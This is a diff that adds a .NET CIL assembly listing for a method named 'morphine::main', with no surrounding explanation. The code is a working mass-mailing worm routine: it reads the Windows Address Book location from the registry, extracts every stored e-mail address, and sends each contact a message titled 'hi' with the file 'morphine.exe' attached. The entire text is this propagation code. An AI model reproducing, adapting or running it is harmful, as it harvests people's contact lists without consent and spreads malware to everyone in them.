@@ -1,0 +1,133 @@
+.method public static void  main() cil managed
+{
+  .entrypoint
+  // Code size       409 (0x199)
+  .maxstack  4
+  .locals (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
+           string V_1,
+           class [mscorlib]System.IO.FileStream V_2,
+           class [mscorlib]System.Byte[] V_3,
+           int32 V_4,
+           int32 V_5,
+           int32 V_6,
+           string V_7,
+           string V_8,
+           int32 V_9,
+           class [System.Web]System.Web.Mail.MailMessage V_10,
+           class [System.Web]System.Web.Mail.MailAttachment V_11)
+  IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey class [mscorlib]Microsoft.Win32.Registry::CurrentUser
+  IL_0005:  ldstr      "Software\\Microsoft\\WAB\\WAB4\\Wab File Name"
+  IL_000a:  call       instance class [mscorlib]Microsoft.Win32.RegistryKey class [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
+  IL_000f:  stloc      V_0
+  IL_0013:  ldloc      V_0
+  IL_0017:  brfalse    IL_0198
+  IL_001c:  ldloc      V_0
+  IL_0020:  ldstr      ""
+  IL_0025:  call       instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
+  IL_002a:  stloc      V_1
+  IL_002e:  ldloc      V_1
+  IL_0032:  brfalse    IL_0198
+  IL_0037:  ldloc      V_0
+  IL_003b:  call       instance void class [mscorlib]Microsoft.Win32.RegistryKey::Close()
+  IL_0040:  ldloc      V_1
+  IL_0044:  ldc.i4.3
+  IL_0045:  ldc.i4.1
+  IL_0046:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
+                                                                           valuetype [mscorlib]System.IO.FileMode,
+                                                                           valuetype [mscorlib]System.IO.FileAccess)
+  IL_004b:  stloc      V_2
+  IL_004f:  ldloc      V_2
+  IL_0053:  call       instance int64 class [mscorlib]System.IO.FileStream::get_Length()
+  IL_0058:  call       int32 class [mscorlib]System.Convert::ToInt32(int64)
+  IL_005d:  stloc      V_4
+  IL_0061:  ldloc      V_4
+  IL_0065:  newarr     class [mscorlib]System.Byte
+  IL_006a:  stloc      V_3
+  IL_006e:  ldloc      V_2
+  IL_0072:  ldloc      V_3
+  IL_0076:  ldc.i4.0
+  IL_0077:  ldloc      V_4
+  IL_007b:  call       instance int32 class [mscorlib]System.IO.FileStream::Read(uint8[],
+                                                                                 int32,
+                                                                                 int32)
+  IL_0080:  pop
+  IL_0081:  ldloc      V_2
+  IL_0085:  call       instance void class [mscorlib]System.IO.FileStream::Close()
+  IL_008a:  ldloc      V_3
+  IL_008e:  ldc.i4     0x64
+  IL_0093:  call       int32 class [mscorlib]System.BitConverter::ToInt32(uint8[],
+                                                                          int32)
+  IL_0098:  stloc      V_5
+  IL_009c:  ldloc      V_5
+  IL_00a0:  brfalse    IL_0198
+  IL_00a5:  ldloc      V_3
+  IL_00a9:  ldc.i4     0x60
+  IL_00ae:  call       int32 class [mscorlib]System.BitConverter::ToInt32(uint8[],
+                                                                          int32)
+  IL_00b3:  stloc      V_6
+  IL_00b7:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Unicode()
+  IL_00bc:  ldloc      V_3
+  IL_00c0:  ldloc      V_6
+  IL_00c4:  ldc.i4     0x44
+  IL_00c9:  call       instance string class [mscorlib]System.Text.Encoding::GetString(uint8[],
+                                                                                       int32,
+                                                                                       int32)
+  IL_00ce:  stloc      V_7
+  IL_00d2:  ldloc      V_7
+  IL_00d6:  ldc.i4.0
+  IL_00d7:  call       instance int32 string::IndexOf(char)
+  IL_00dc:  stloc      V_9
+  IL_00e0:  ldloc      V_7
+  IL_00e4:  ldloc      V_9
+  IL_00e8:  ldc.i4     0x22
+  IL_00ed:  ldloc      V_9
+  IL_00f1:  sub
+  IL_00f2:  call       instance string string::Remove(int32,
+                                                      int32)
+  IL_00f7:  stloc      V_7
+  IL_00fb:  newobj     instance void class [System.Web]System.Web.Mail.MailMessage::.ctor()
+  IL_0100:  stloc      V_10
+  IL_0104:  ldloc      V_10
+  IL_0108:  ldstr      "hi"
+  IL_010d:  call       instance void class [System.Web]System.Web.Mail.MailMessage::set_Subject(string)
+  IL_0112:  ldloc      V_10
+  IL_0116:  ldloc      V_7
+  IL_011a:  call       instance void class [System.Web]System.Web.Mail.MailMessage::set_To(string)
+  IL_011f:  ldloc      V_10
+  IL_0123:  ldstr      "hi"
+  IL_0128:  call       instance void class [System.Web]System.Web.Mail.MailMessage::set_Body(string)
+  IL_012d:  ldloc      V_10
+  IL_0131:  ldc.i4.0
+  IL_0132:  call       instance void class [System.Web]System.Web.Mail.MailMessage::set_BodyFormat(valuetype [System.Web]System.Web.Mail.MailFormat)
+  IL_0137:  ldloc      V_10
+  IL_013b:  ldc.i4.2
+  IL_013c:  call       instance void class [System.Web]System.Web.Mail.MailMessage::set_Priority(valuetype [System.Web]System.Web.Mail.MailPriority)
+  IL_0141:  call       string class [mscorlib]System.IO.Directory::GetCurrentDirectory()
+  IL_0146:  ldstr      "\\morphine.exe"
+  IL_014b:  call       string string::Concat(string,
+                                             string)
+  IL_0150:  ldc.i4.1
+  IL_0151:  newobj     instance void class [System.Web]System.Web.Mail.MailAttachment::.ctor(string,
+                                                                                             valuetype [System.Web]System.Web.Mail.MailEncoding)
+  IL_0156:  stloc      V_11
+  IL_015a:  ldloc      V_10
+  IL_015e:  call       instance class [mscorlib]System.Collections.IList class [System.Web]System.Web.Mail.MailMessage::get_Attachments()
+  IL_0163:  ldloc      V_11
+  IL_0167:  callvirt   instance int32 class [mscorlib]System.Collections.IList::Add(object)
+  IL_016c:  pop
+  IL_016d:  ldloc      V_10
+  IL_0171:  call       void class [System.Web]System.Web.Mail.SmtpMail::Send(class [System.Web]System.Web.Mail.MailMessage)
+  IL_0176:  ldloc      V_6
+  IL_017a:  ldc.i4     0x44
+  IL_017f:  add
+  IL_0180:  stloc      V_6
+  IL_0184:  ldloc      V_5
+  IL_0188:  ldc.i4.1
+  IL_0189:  sub
+  IL_018a:  stloc      V_5
+  IL_018e:  ldloc      V_5
+  IL_0192:  ldc.i4.0
+  IL_0193:  bgt        IL_00b7
+  IL_0198:  ret
+} // end of method morphine::main
+
